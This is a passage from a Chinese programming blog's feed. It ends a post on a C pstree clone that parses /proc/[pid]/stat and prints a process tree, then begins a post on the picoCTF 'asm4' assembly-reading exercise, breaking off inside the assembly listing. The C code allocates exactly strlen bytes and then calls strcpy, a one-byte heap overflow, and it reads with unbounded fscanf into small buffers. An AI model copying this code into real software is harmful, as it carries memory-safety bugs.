&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 读取/proc/[pid]/stat文件</span></span><br><span class="line"><span class="comment"> * 其ppid应该为已经添加过得进程</span></span><br><span class="line"><span class="comment"> * 根据上述文件内容生成PNODE,</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">Get_Pnode</span><span class="params">(<span class="type">pid_t</span> pid)</span> &#123;</span><br><span class="line"><span class="type">char</span> pstat[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;, comm[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">pid_t</span> ppid = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(pstat, <span class="string">&quot;/proc/%ld/stat&quot;</span>, (<span class="type">long</span>)pid);</span><br><span class="line"></span><br><span class="line">FILE *fstat = fopen(pstat, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fstat) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取/proc/[pid]/stat四个字段，第一个，第三个字段仅仅是占位使用，没有实际意义</span></span><br><span class="line"><span class="built_in">fscanf</span>(fstat, <span class="string">&quot;%d (%s %c %d&quot;</span>, (<span class="type">int</span>*)pstat, comm, pstat, &amp;ppid);</span><br><span class="line"><span class="keyword">if</span>((ppid = Search_Pnode(ppid)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">Pnode *pnode = (Pnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Pnode));</span><br><span class="line">pnode-&gt;pid = pid;</span><br><span class="line">pnode-&gt;son = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于其第二个字段形式为 (comm) ,因此最后一个括号需要被消除</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(comm);</span><br><span class="line">pnode-&gt;comm = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line"><span class="built_in">strcpy</span>(pnode-&gt;comm, comm);</span><br><span class="line">pnode-&gt;comm[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!Array_Get(Pnode*, pnodes, ppid)-&gt;son) &#123; Array_Get(Pnode*, pnodes, ppid)-&gt;son = Array_Init(<span class="type">int</span>, <span class="number">1</span>); &#125;</span><br><span class="line">Array_Insert(<span class="type">int</span>, Array_Get(Pnode*, pnodes, ppid)-&gt;son, &amp;(pnodes-&gt;size));</span><br><span class="line">Array_Insert(Pnode*, pnodes, &amp;pnode);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fstat);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化第一个进程信息</span></span><br><span class="line"><span class="comment"> * 然后从小到大开始遍历即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">Get_Pnodes</span><span class="params">()</span> &#123;</span><br><span class="line">assert(pids &amp;&amp; pids-&gt;arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化第一个进程信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pnodes = Array_Init(Pnode*, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> pstat[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;, comm[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(pstat, <span class="string">&quot;/proc/%ld/stat&quot;</span>, (<span class="type">long</span>)(Array_Get(<span class="type">pid_t</span>, pids, <span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line">FILE *fstat = fopen(pstat, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fstat) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取/proc/[pid]/stat两个字段，第一个仅仅是占位使用，没有实际意义</span></span><br><span class="line"><span class="built_in">fscanf</span>(fstat, <span class="string">&quot;%d (%s&quot;</span>, (<span class="type">int</span>*)pstat, comm);</span><br><span class="line">Pnode *pnode = (Pnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Pnode));</span><br><span class="line">pnode-&gt;pid = Array_Get(<span class="type">pid_t</span>, pids, <span class="number">0</span>);</span><br><span class="line">pnode-&gt;son = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于其第二个字段形式为 (comm) ,因此最后一个括号需要被消除</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(comm);</span><br><span class="line">pnode-&gt;comm = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line"><span class="built_in">strcpy</span>(pnode-&gt;comm, comm);</span><br><span class="line">pnode-&gt;comm[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">Array_Insert(Pnode*, pnodes, &amp;pnode);</span><br><span class="line">fclose(fstat);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 下面开始自小向大遍历整个进程数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; pids-&gt;size; ++i) &#123; Get_Pnode(Array_Get(<span class="type">pid_t</span>, pids, i)); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="建树和打印"><a href="#建树和打印" class="headerlink" title="建树和打印"></a>建树和打印</h3><p>  这也就是最后一部，即建树和打印。实际上这里为了方便起见，采用横向树，即子树先向右生成，多余的接着向下生长<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1--p2--p3</span><br><span class="line">|   |</span><br><span class="line">|   +---p4--p5</span><br><span class="line">|</span><br><span class="line">+---p6</span><br></pre></td></tr></table></figure></p><p>  这种形式的输出，可以使用<strong>DFS</strong>遍历，并且由于是一个树而非森林，则执行一遍<strong>DFS</strong>即可。当遍历到无可处理子进程的进程时，直接一行打印即可，接着回退进入下一行输出即可。<br>  整个建树和打印的流程如下:</p><ol><li>按照深度优先将处理当前进程入栈，并处理进程的下一个子进程，直到遇到没有子进程的进程为止。在这个过程中需要记录<strong>最左侧下标</strong>，以及<strong>已成功处理的子进程数量</strong>和<strong>是否已经打印</strong>，为之后打印做准备</li><li>按照前面的记录信息，如果打印第一行，直接跳转到步骤3。否则如果还未打印，则以空格填充；否则输出‘|’并填充”空格”对齐。</li><li>按照前面的记录信息，如果还未打印，则打印<strong>进程信息</strong>，并修改标记值。否则如果等于最左侧下标，输出‘+’并填充”-“对齐；否则输出’|’并填充空格对齐。这些通过”—“相连接。</li><li><p>将当前进程成功处理子进程的数量自增1，如果此时已成功处理的子进程个数 + 1 大于等于进程的子进程个数，继续执行步骤4，直到栈空；否则，跳转到步骤1开始执行</p><p>最后相关的代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 建树所需要的结构</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PSTACKNODE</span> &#123;</span></span><br><span class="line">Pnode *pnode;</span><br><span class="line"><span class="type">int</span> processedSon;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hasPrint;</span><br><span class="line">&#125; PStackNode;</span><br><span class="line">Array *<span class="built_in">stack</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据stack的信息，打印一/两行输出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">Print_Line</span><span class="params">(<span class="type">int</span> line, <span class="type">pid_t</span> leftPid)</span> &#123;</span><br><span class="line">assert(<span class="built_in">stack</span> &amp;&amp; <span class="built_in">stack</span>-&gt;size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 首先执行步骤二，输出|信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(line) &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">stack</span>-&gt;size; ++i) &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hasPrint = Array_Get(PStackNode*, <span class="built_in">stack</span>, i)-&gt;hasPrint;</span><br><span class="line">Pnode *pnode = Array_Get(PStackNode*, <span class="built_in">stack</span>, i)-&gt;pnode;</span><br><span class="line"><span class="keyword">if</span>(hasPrint) &#123;</span><br><span class="line"><span class="comment">//输出&#x27;|&#x27;，并用空格进行填充</span></span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(pnode-&gt;comm);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; len; ++j) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>); &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(pnode-&gt;comm);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; ++j) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 接着执行步骤三，输出+/命令信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> needDotLine = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">stack</span>-&gt;size; ++i) &#123;</span><br><span class="line">PStackNode* pstacknode = Array_Get(PStackNode*, <span class="built_in">stack</span>, i);</span><br><span class="line">Pnode *pnode = pstacknode-&gt;pnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(needDotLine) &#123;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i)&#123;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!pstacknode-&gt;hasPrint) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, pnode-&gt;comm);</span><br><span class="line">pstacknode-&gt;hasPrint = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(!line) &#123; needDotLine = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(leftPid == pnode-&gt;pid) &#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(pnode-&gt;comm);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;+&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; len; ++j) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>); &#125;</span><br><span class="line">needDotLine = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(pnode-&gt;comm);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; len; ++j) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即执行第四步，开始回退</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">Go_Back</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">stack</span>-&gt;size) &#123;</span><br><span class="line">PStackNode* p_stack_node = Array_Get(PStackNode*, <span class="built_in">stack</span>, <span class="built_in">stack</span>-&gt;size - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p_stack_node-&gt;pnode-&gt;son || (p_stack_node-&gt;processedSon + <span class="number">1</span> &gt;= p_stack_node-&gt;pnode-&gt;son-&gt;size)) &#123;</span><br><span class="line">Array_Fini(p_stack_node-&gt;pnode-&gt;son);</span><br><span class="line"><span class="built_in">free</span>(p_stack_node-&gt;pnode-&gt;comm);</span><br><span class="line"><span class="built_in">free</span>(p_stack_node-&gt;pnode);</span><br><span class="line"><span class="built_in">free</span>(p_stack_node);</span><br><span class="line">--<span class="built_in">stack</span>-&gt;size;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(++p_stack_node-&gt;processedSon &lt; p_stack_node-&gt;pnode-&gt;son-&gt;size) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 开始构建进程树并输出</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 即初始化栈</span></span><br><span class="line"><span class="comment"> * 遍历栈即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">Build_Print</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">assert(pnodes &amp;&amp; pnodes-&gt;arr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span> = Array_Init(PStackNode*, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//初始化进程号为1的进程</span></span><br><span class="line">PStackNode *initPStackNode = (PStackNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PStackNode));</span><br><span class="line">initPStackNode-&gt;pnode = Array_Get(Pnode*, pnodes, <span class="number">0</span>);</span><br><span class="line">initPStackNode-&gt;processedSon = initPStackNode-&gt;hasPrint = <span class="number">0</span>;</span><br><span class="line">Array_Insert(PStackNode*, <span class="built_in">stack</span>, &amp;initPStackNode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> line = <span class="number">0</span>; <span class="built_in">stack</span>-&gt;size; ++line) &#123;</span><br><span class="line">PStackNode *pstacknode = Array_Get(PStackNode*, <span class="built_in">stack</span>, <span class="built_in">stack</span>-&gt;size - <span class="number">1</span>);</span><br><span class="line"><span class="type">pid_t</span> leftPid = pstacknode-&gt;pnode-&gt;pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始遍历进程，直到没有子进程</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="type">int</span> sonIdx = Array_Get(<span class="type">int</span>, pstacknode-&gt;pnode-&gt;son, pstacknode-&gt;processedSon);</span><br><span class="line">pstacknode = (PStackNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PStackNode));</span><br><span class="line">pstacknode-&gt;pnode = Array_Get(Pnode*, pnodes, sonIdx);</span><br><span class="line">pstacknode-&gt;processedSon = pstacknode-&gt;hasPrint = <span class="number">0</span>;</span><br><span class="line">Array_Insert(PStackNode*, <span class="built_in">stack</span>, &amp;pstacknode);</span><br><span class="line">&#125;<span class="keyword">while</span>(pstacknode-&gt;pnode-&gt;son &amp;&amp; (pstacknode-&gt;processedSon &lt; pstacknode-&gt;pnode-&gt;son-&gt;size));</span><br><span class="line"></span><br><span class="line">Print_Line(line, leftPid);</span><br><span class="line">Go_Back();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  这里需要注意一下，<strong>系统pstree</strong>程序不仅仅输出系统的进程信息，还包含这进程下的线程信息，这些本次实验并没有要求，因此并未输出。<br>  其输出结果如下所示<br>  <img src="实验结果.PNG" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调用汇编代码符号</title>
      <link href="/2021/07/22/%E8%B0%83%E7%94%A8%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E7%AC%A6%E5%8F%B7/"/>
      <url>/2021/07/22/%E8%B0%83%E7%94%A8%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E7%AC%A6%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  这里遇到了一个相关的<strong>CTF</strong>习题，看到其<em>WP</em>中的思路不错，特别学习一下</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>  其是<strong>picoCTF</strong>的<a href="https://play.picoctf.org/practice?page=1&amp;search=asm4">asm4</a>，题目要求获取调用<code>asm4(&quot;picoCTF_a3112&quot;)</code>的结果，其中附件代码如下所示<br>  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">asm4:</span></span><br><span class="line">        &lt;+<span class="number">0</span>&gt;:   <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">        &lt;+<span class="number">1</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">        &lt;+<span class="number">3</span>&gt;:   <span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">        &lt;+<span class="number">4</span>&gt;:   <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">        &lt;+<span class="number">7</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="number">0x246</span></span><br><span class="line">        &lt;+<span class="number">14</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line">        &lt;+<span class="number">21</span>&gt;:  <span class="keyword">jmp</span>    <span class="number">0x518</span> &lt;asm4+<span class="number">27</span>&gt;</span><br><span class="line">        &lt;+<span class="number">23</span>&gt;:  <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x1</span></span><br><span class="line">        &lt;+<span class="number">27</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line">        &lt;+<span class="number">30</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">33</span>&gt;:  <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">        &lt;+<span class="number">35</span>&gt;:  <span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line">        &lt;+<span class="number">38</span>&gt;:  <span class="keyword">test</span>   <span class="built_in">al</span>,<span class="built_in">al</span></span><br><span class="line">        &lt;+<span class="number">40</span>&gt;:  <span class="keyword">jne</span>    <span class="number">0x514</span> &lt;asm4+<span class="number">23</span>&gt;</span><br><span class="line">        &lt;+<span class="number">42</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line">        &lt;+<span class="number">49</span>&gt;:  <span class="keyword">jmp</span>    <span class="number">0x587</span> &lt;asm4+<span class="number">138</span>&gt;</span><br><span class="line">        &lt;+<span class="number">51</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">54</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">57</span>&gt;:  <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">        &lt;+<span class="number">59</span>&gt;:  <span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line">        &lt;+<span class="number">62</span>&gt;:  <span class="keyword">movsx</span>  <span class="built_in">edx</span>,<span class="built_in">al</span></span><br><span class="line">        &lt;+<span class="number">65</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">68</span>&gt;:  <span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">eax</span>-<span class="number">0x1</span>]</span><br><span class="line">        &lt;+<span class="number">71</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">74</span>&gt;:  <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">        &lt;+<span class="number">76</span>&gt;:  <span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">eax</span>]</span><br><span class="line">        &lt;+<span class="number">79</span>&gt;:  <span class="keyword">movsx</span>  <span class="built_in">eax</span>,<span class="built_in">al</span></span><br><span class="line">        &lt;+<span class="number">82</span>&gt;:  <span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line">        &lt;+<span class="number">84</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">        &lt;+<span class="number">86</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line">        &lt;+<span class="number">88</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">        &lt;+<span class="number">91</span>&gt;:  <span class="keyword">lea</span>    <span class="built_in">ebx</span>,[<span class="built_in">edx</span>+<span class="built_in">eax</span>*<span class="number">1</span>]</span><br><span class="line">        &lt;+<span class="number">94</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x8</span>]</span><br><span class="line">        &lt;+<span class="number">97</span>&gt;:  <span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">eax</span>+<span class="number">0x1</span>]</span><br><span class="line">        &lt;+<span class="number">100</span>&gt;: <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span 